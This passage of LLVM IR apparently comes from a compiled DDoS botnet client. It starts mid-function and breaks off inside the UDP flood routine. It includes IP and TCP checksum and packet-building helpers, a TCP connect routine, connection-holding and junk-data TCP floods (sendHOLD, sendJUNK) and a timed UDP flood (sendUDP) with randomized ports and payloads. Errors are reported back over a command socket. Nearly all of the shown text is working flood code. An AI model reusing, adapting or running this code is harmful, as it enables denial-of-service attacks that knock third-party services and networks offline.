  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !15

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !16

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %6 to %struct.timeval*
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %97

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = bitcast i32* %8 to i8*
  br label %.preheader

.loopexit.loopexit:                               ; preds = %95
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %35 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %36 = icmp sgt i32 %28, %35
  br i1 %36, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %95
  %indvars.iv = phi i64 [ %indvars.iv.next, %95 ], [ 0, %.lr.ph.preheader ]
  %37 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %38 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %39 = load i8, i8* %38, align 4
  switch i8 %39, label %95 [
    i8 0, label %40
    i8 1, label %55
    i8 2, label %78
  ]

; <label>:40:                                     ; preds = %.lr.ph
  %41 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  store i32 %41, i32* %42, align 8
  %43 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 3, i8* null) #3
  %44 = or i32 %43, 2048
  %45 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 4, i32 %44) #3
  %46 = call i32 @connect(i32 %41, %struct.sockaddr* nonnull %32, i32 16) #3
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %40
  %49 = tail call i32* @__errno_location() #18
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %54, label %52

; <label>:52:                                     ; preds = %48, %40
  %53 = call i32 @close(i32 %41) #3
  br label %95

; <label>:54:                                     ; preds = %48
  store i8 1, i8* %38, align 4
  br label %95

; <label>:55:                                     ; preds = %.lr.ph
  %56 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !18
  %57 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  %58 = load i32, i32* %57, align 8
  %59 = srem i32 %58, 64
  %60 = zext i32 %59 to i64
  %61 = shl i64 1, %60
  %62 = sdiv i32 %58, 64
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %63
  %65 = load i64, i64* %64, align 8
  %66 = or i64 %61, %65
  store i64 %66, i64* %64, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %67 = add nsw i32 %58, 1
  %68 = call i32 @select(i32 %67, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %68, label %95 [
    i32 1, label %69
    i32 -1, label %76
  ]

; <label>:69:                                     ; preds = %55
  store i32 4, i32* %7, align 4
  %70 = call i32 @getsockopt(i32 %58, i32 1, i32 4, i8* nonnull %34, i32* nonnull %7) #3
  %71 = load i32, i32* %8, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %69
  %74 = call i32 @close(i32 %58) #3
  br label %75

; <label>:75:                                     ; preds = %69, %73
  %.sink = phi i8 [ 0, %73 ], [ 2, %69 ]
  store i8 %.sink, i8* %38, align 4
  br label %95

; <label>:76:                                     ; preds = %55
  %77 = call i32 @close(i32 %58) #3
  store i8 0, i8* %38, align 4
  br label %95

; <label>:78:                                     ; preds = %.lr.ph
  %79 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !19
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = srem i32 %81, 64
  %83 = zext i32 %82 to i64
  %84 = shl i64 1, %83
  %85 = sdiv i32 %81, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = or i64 %84, %88
  store i64 %89, i64* %87, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %90 = add nsw i32 %81, 1
  %91 = call i32 @select(i32 %90, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %tmpcast) #3
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %95, label %93

; <label>:93:                                     ; preds = %78
  %94 = call i32 @close(i32 %81) #3
  store i8 0, i8* %38, align 4
  br label %95

; <label>:95:                                     ; preds = %55, %78, %.lr.ph, %54, %52, %76, %75, %93
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %96 = icmp slt i64 %indvars.iv.next, %25
  br i1 %96, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %97

; <label>:97:                                     ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %6 to %struct.timeval*
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %92

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = bitcast i32* %8 to i8*
  br label %.preheader

.loopexit.loopexit:                               ; preds = %90
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %29, %36
  br i1 %37, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %90
  %indvars.iv = phi i64 [ %indvars.iv.next, %90 ], [ 0, %.lr.ph.preheader ]
  %38 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %39 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %40 = load i8, i8* %39, align 4
  switch i8 %40, label %90 [
    i8 0, label %41
    i8 1, label %56
    i8 2, label %79
  ]

; <label>:41:                                     ; preds = %.lr.ph
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  store i32 %42, i32* %43, align 8
  %44 = call i32 (i32, i32, ...) @fcntl(i32 %42, i32 3, i8* null) #3
  %45 = or i32 %44, 2048
  %46 = call i32 (i32, i32, ...) @fcntl(i32 %42, i32 4, i32 %45) #3
  %47 = call i32 @connect(i32 %42, %struct.sockaddr* nonnull %33, i32 16) #3
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %41
  %50 = tail call i32* @__errno_location() #18
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, 115
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %49, %41
  %54 = call i32 @close(i32 %42) #3
  br label %90

; <label>:55:                                     ; preds = %49
  store i8 1, i8* %39, align 4
  br label %90

; <label>:56:                                     ; preds = %.lr.ph
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #3, !srcloc !20
  %58 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  %59 = load i32, i32* %58, align 8
  %60 = srem i32 %59, 64
  %61 = zext i32 %60 to i64
  %62 = shl i64 1, %61
  %63 = sdiv i32 %59, 64
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %64
  %66 = load i64, i64* %65, align 8
  %67 = or i64 %62, %66
  store i64 %67, i64* %65, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %68 = add nsw i32 %59, 1
  %69 = call i32 @select(i32 %68, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %69, label %90 [
    i32 1, label %70
    i32 -1, label %77
  ]

; <label>:70:                                     ; preds = %56
  store i32 4, i32* %7, align 4
  %71 = call i32 @getsockopt(i32 %59, i32 1, i32 4, i8* nonnull %35, i32* nonnull %7) #3
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %76, label %74

; <label>:74:                                     ; preds = %70
  %75 = call i32 @close(i32 %59) #3
  br label %76

; <label>:76:                                     ; preds = %70, %74
  %.sink = phi i8 [ 0, %74 ], [ 2, %70 ]
  store i8 %.sink, i8* %39, align 4
  br label %90

; <label>:77:                                     ; preds = %56
  %78 = call i32 @close(i32 %59) #3
  store i8 0, i8* %39, align 4
  br label %90

; <label>:79:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = call i64 @send(i32 %81, i8* %27, i64 1024, i32 16384) #3
  %83 = icmp eq i64 %82, -1
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %79
  %85 = tail call i32* @__errno_location() #18
  %86 = load i32, i32* %85, align 4
  %87 = icmp eq i32 %86, 11
  br i1 %87, label %90, label %88

; <label>:88:                                     ; preds = %84
  %89 = call i32 @close(i32 %81) #3
  store i8 0, i8* %39, align 4
  br label %90

; <label>:90:                                     ; preds = %56, %84, %.lr.ph, %55, %53, %77, %76, %88, %79
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %91 = icmp slt i64 %indvars.iv.next, %25
  br i1 %91, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %92

; <label>:92:                                     ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8* nocapture readnone, i32, i32) local_unnamed_addr #1 {
  %4 = tail call i32 @fork() #3
  ret void
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #18
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %62

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %41 = add nsw i32 %40, %2
  %42 = sext i32 %4 to i64
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %39
  %.068.ph = phi i32 [ 0, %39 ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %39 ], [ %56, %.outer.backedge ]
  br label %45

; <label>:45:                                     ; preds = %.outer, %52
  %.067 = phi i32 [ 0, %52 ], [ %.067.ph, %.outer ]
  %46 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %47 = icmp eq i32 %.067, %5
  br i1 %47, label %48, label %55

; <label>:48:                                     ; preds = %45
  br i1 %12, label %49, label %52

; <label>:49:                                     ; preds = %48
  %50 = call i32 @rand_cmwc()
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %20, align 2
  br label %52

; <label>:52:                                     ; preds = %49, %48
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %54 = icmp sgt i32 %53, %41
  br i1 %54, label %.loopexit.loopexit, label %45

; <label>:55:                                     ; preds = %45
  %56 = add i32 %.067, 1
  %57 = icmp eq i32 %.068.ph, %6
  br i1 %57, label %58, label %60

; <label>:58:                                     ; preds = %55
  %59 = call i32 @usleep(i32 %44) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %58, %60
  %.068.ph.be = phi i32 [ %61, %60 ], [ 0, %58 ]
  br label %.outer

; <label>:60:                                     ; preds = %55
  %61 = add i32 %.068.ph, 1
